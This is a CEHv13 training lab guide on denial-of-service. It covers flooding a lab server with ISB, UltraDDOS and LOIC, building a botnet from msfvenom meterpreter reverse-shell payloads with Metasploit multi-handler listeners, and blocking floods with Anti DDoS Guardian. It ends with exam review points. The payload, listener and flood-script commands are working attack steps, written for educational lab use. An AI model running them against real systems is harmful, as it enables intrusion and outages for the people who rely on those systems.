# Module 10: Denial-of-Service - Lab Guide

## Tools Used & Purpose

- **LOIC (Low Orbit Ion Cannon)**: Network stress-testing application for generating coordinated TCP, UDP, and HTTP GET volumetric floods.
- **HOIC (High Orbit Ion Cannon)**: Application-layer HTTP flooding tool utilizing custom booster scripts to randomize request headers and defeat basic rate limiting.
- **ISB (I'm So Bored)**: Windows GUI multi-vector packet flooder supporting TCP, UDP, ICMP, and Slowloris attacks.
- **UltraDDOS-v2**: High-speed multi-threaded packet flooder capable of spawning millions of simultaneous socket requests to exhaust system resources.
- **Hping3**: CLI packet crafter generating targeted SYN floods, ICMP echo floods, UDP storms, and Smurf broadcast amplification attacks.
- **Metasploit Framework**: Deploying automated botnet simulation scripts and multi-handler listener C2 infrastructure.
- **Anti DDoS Guardian**: Real-time network traffic monitor and driver-level firewall used to detect, analyze, and block malicious DoS/DDoS flooding IPs.
- **Wireshark**: Capturing and analyzing DoS/DDoS packet floods, conversation packet rates, and identifying attacking source IP addresses.
- **Slowloris**: Low-bandwidth Layer 7 denial-of-service tool keeping HTTP connections open indefinitely using incomplete request headers.

---

## 6. Detailed Hands-On Labs (Official CEHv13 Curriculum)

### Lab 1: Perform DoS and DDoS Attacks using Various Techniques

#### Task 1: Perform a DDoS Attack using ISB (I'm So Bored) and UltraDDOS-v2

- <b>Lab Duration:</b> 10 Minutes \| <b>Required Privilege:</b> Administrator
- <b>Target Environment:</b>
  - <i>Victim VM:</i> Windows Server 2019 (<code>10.10.1.19:80</code>)
  - <i>Attacker VM 1:</i> Windows 11 (<code>10.10.1.11</code>) running <code>ISB.exe</code>
  - <i>Attacker VM 2:</i> Windows Server 2022 (<code>10.10.1.22</code>) running <code>UltraDDOS-v2.exe</code>

#### Practical Execution Steps:

1. <b>Configure ISB on Windows 11:</b>
   - On Windows 11, navigate to <code>E:\CEH-Tools\CEHv13 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\ISB</code> and execute <code>ISB (Im So Bored).exe</code>.
   - In the <b>URL:</b> field, type <code>10.10.1.19</code> (Windows Server 2019 target).
   - In the <b>Port:</b> field, enter <code>80</code>, and click <b>Set Target</b>.
   - Navigate to the <b>TCP Flood</b> tab under the Attacks menu.
   - Configure the flood parameters:
     - <b>Interval:</b> <code>10</code> ms
     - <b>Buffer:</b> <code>256</code> bytes
     - <b>Threads:</b> <code>1000</code>
   - Keep the ISB window open without starting the attack yet.
2. <b>Configure UltraDDOS-v2 on Windows Server 2022:</b>
   - Log into Windows Server 2022 (<code>Administrator / Pa$$wOrd</code>).
   - Navigate to <code>E:\CEH-Tools\CEHv13 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\UltraDDOS</code> and run <code>ultraddos.exe</code>.
   - Click <b>DDOS Attack</b> button and enter the parameters:
     - <i>Target Website or IP:</i> <code>10.10.1.19</code>
     - <i>Port:</i> <code>80</code>
     - <i>Packets to Send:</i> <code>1000000</code>
     - <i>Threads:</i> <code>1000000</code>
   - Click <b>OK</b> to launch the attack stream from Windows Server 2022.
3. <b>Trigger Multi-Source DDoS & Monitor Victim Impact:</b>
   - Switch back to Windows 11 and click <b>Start Attack</b> on ISB.
   - Switch to the target machine (Windows Server 2019).
   - Search for and open <b>Resource Monitor</b> (<code>resmon.exe</code>).
   - <i>Observation:</i> The <b>CPU Usage</b> under the CPU tab instantly surges past <b>80%–100%</b>, system responsiveness degrades severely, network interface utilization spikes, and the web server becomes completely unreachable to external clients.

---

#### Task 2: Perform a DDoS Attack using a Botnet

- <b>Target Environment:</b>
  - <i>Attacker / Master C2:</i> Parrot Security (<code>10.10.1.13</code>)
  - <i>Compromised Bots / Zombies:</i>
    - Zombie 1: Windows 11 (<code>10.10.1.11</code>)
    - Zombie 2: Windows Server 2019 (<code>10.10.1.19</code>)
    - Zombie 3: Windows Server 2022 (<code>10.10.1.22</code>)
  - <i>Target Host:</i> Ubuntu Server (<code>10.10.1.9</code>)

#### Practical Execution Steps:

1. <b>Generate Custom Meterpreter Payloads with </b><b><code>msfvenom</code></b><b>:</b>
   - On Parrot Security, open a root terminal (<code>sudo su</code>, password <code>toor</code>).
   - Generate distinct payload executables listening on different ports:
     ```bash
     # Payload for Windows 11 (Port 6969)
     msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe

     # Payload for Windows Server 2019 (Port 9999)
     msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=9999 -f exe > exploit2.exe

     # Payload for Windows Server 2022 (Port 5555)
     msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=5555 -f exe > exploit3.exe
     ```
2. <b>Host Exploits via Local Apache Web Server:</b>
   ```bash
   mkdir /var/www/html/share
   chmod -R 755 /var/www/html/share/
   chown -R www-data:www-data /var/www/html/share/
   cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
   service apache2 start
   ```
3. <b>Launch Multi-Handler Listeners in Metasploit:</b>
   - Open three separate terminal windows on Parrot and initialize handlers:
     ```bash
     # Terminal 1:
     msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"

     # Terminal 2:
     msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 9999; run"

     # Terminal 3:
     msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 5555; run"
     ```
4. <b>Infect Botnet Nodes:</b>
   - Access <code>http://10.10.1.13/share</code> from Windows 11, Windows Server 2019, and Windows Server 2022.
   - Download and execute <code>exploit1.exe</code>, <code>exploit2.exe</code>, and <code>exploit3.exe</code> respectively.
   - Three active Meterpreter sessions are established back to the Parrot C2 master.
5. <b>Deploy and Execute Synchronized DDoS Script:</b>
   - From each active Meterpreter shell on Parrot, upload the DDoS flooder script to the zombies:
     ```bash
     upload /home/attacker/ddos_attack.py C:\\Users\\Public\\ddos_attack.py
     shell
     python C:\\Users\\Public\\ddos_attack.py 10.10.1.9
     ```
6. <b>Analyze DDoS Traffic Avalanche on Ubuntu Target:</b>
   - On the Ubuntu target (<code>10.10.1.9</code>), open terminal and launch Wireshark:
     ```bash
     sudo wireshark
     ```
   - Start capturing on interface <code>eth0</code>.
   - <i>Observation:</i> Wireshark captures an overwhelming torrent of fragmented IP packets originating simultaneously from <code>10.10.1.11</code>, <code>10.10.1.19</code>, and <code>10.10.1.22</code>.
   - Open Ubuntu <b>System Monitor</b>: Memory and swap utilization surges to <b>98.7%</b>, CPU load spikes across all cores, network socket buffers exhaust, and the Ubuntu machine freezes and becomes completely unresponsive.

---

### Lab 2: Detect and Protect Against DoS and DDoS Attacks using Anti DDoS Guardian

- <b>Lab Duration:</b> 10 Minutes \| <b>Required Privilege:</b> Administrator
- <b>Target Environment:</b>
  - <i>Protected Host:</i> Windows 11 (<code>10.10.1.11</code>)
  - <i>Attacking Hosts:</i> Windows Server 2019 (<code>10.10.1.19</code>) and Windows Server 2022 (<code>10.10.1.22</code>) running Low Orbit Ion Cannon (<code>LOIC.exe</code>)

#### Practical Execution Steps:

1. <b>Install and Configure Anti DDoS Guardian on Windows 11:</b>
   - Navigate to <code>E:\CEH-Tools\CEHv13 Module 10 Denial-of-Service\DoS and DDoS Protection Tools\Anti DDoS Guardian</code> and execute <code>setup.exe</code>.
   - Complete installation, uncheck "Stop RDP Brute Force", and launch the application.
   - The main dashboard monitors real-time incoming and outgoing network flows, packet arrival rates, bandwidth utilization, and connection states.
2. <b>Launch Coordinated UDP Flood from Attack Hosts via LOIC:</b>
   - On Windows Server 2019 and Windows Server 2022, launch <code>LOIC.exe</code>.
   - In <b>Select your target</b>, enter IP <code>10.10.1.11</code> and click <b>Lock on</b>.
   - Under <b>Attack options</b>, select <b>Method:</b> <code>UDP</code>, set <b>Threads:</b> <code>5</code>, and adjust the power slider.
   - Click the prominent <b>IMMA CHARGIN MAH LAZER</b> button on both servers to flood Windows 11.
3. <b>Detect and Analyze Malicious Flows in Anti DDoS Guardian:</b>
   - Switch back to Windows 11. Anti DDoS Guardian detects the sudden, abnormal spike in incoming packet rates from <code>10.10.1.19</code> and <code>10.10.1.22</code>.
   - Double-click the active connection session for <code>10.10.1.22</code> to open the <b>Traffic Detail Viewer</b>.
   - Review raw telemetry: Unusually high byte rates, uniform UDP packet sizes, and absence of valid application payload.
4. <b>Enforce Mitigation & Automated IP Blocking:</b>
   - In the Traffic Detail Viewer left pane, click <b>Block IP (B)</b>.
   - Repeat for host <code>10.10.1.19</code>.
   - <i>Observation:</i> The blocked IP sessions immediately turn <b>red</b> in the <b>Action Taken</b> column.
   - Anti DDoS Guardian drops all incoming packets from the offending IPs at the NDIS driver level before they can consume OS sockets or TCP/IP stack buffers.
   - CPU and memory on Windows 11 immediately stabilize back to normal levels.

---

## 7. CEHv13 High-Frequency Exam Anchors & Review Checklist

### 7.1 Core Exam Distinctions & "Gotchas"

- <b>Smurf vs. Fraggle Attack:</b> Smurf broadcasts <b>ICMP Echo Requests</b> with a spoofed victim IP; Fraggle broadcasts <b>UDP packets</b> to <b>Port 7 (Echo)</b> or <b>Port 19 (CHARGEN)</b>. Both exploit network broadcasts for massive amplification.
- <b>Ping of Death vs. Teardrop:</b> PoD sends an oversized packet (>65,535 bytes) via fragmentation; Teardrop sends packets with <b>overlapping offset fields</b> to crash reassembly logic.
- <b>Slowloris vs. RUDY (Slow POST):</b> Slowloris sends incomplete HTTP <b>headers</b> with periodic keep-alive lines (<code>X-a: b\r\n</code>); RUDY sends a valid header with a massive <code>Content-Length</code> and transmits the HTTP <b>body</b> at 1 byte per interval.
- <b>NTP Amplification Key Indicator:</b> The <code>monlist</code> command (returns up to 600 last-connected hosts, 556x amplification factor).
- <b>RFC 2827 / RFC 3704 / BCP 38:</b> Mandatory internet standard for <b>Network Ingress Filtering</b> and Unicast Reverse Path Forwarding (uRPF) to prevent source IP address spoofing.
- <b>LOIC vs. HOIC:</b> LOIC does <b>not</b> support source IP spoofing (attacker IP is exposed); HOIC uses <b>booster scripts</b> (<code>.hoic</code>) to randomize HTTP headers and bypass simple WAF rules.
- <b>SYN Cookies Mechanics:</b> Avoids allocating kernel backlog connection memory by cryptographically encoding state into the 32-bit Initial Sequence Number (ISN) of the <code>SYN/ACK</code>.
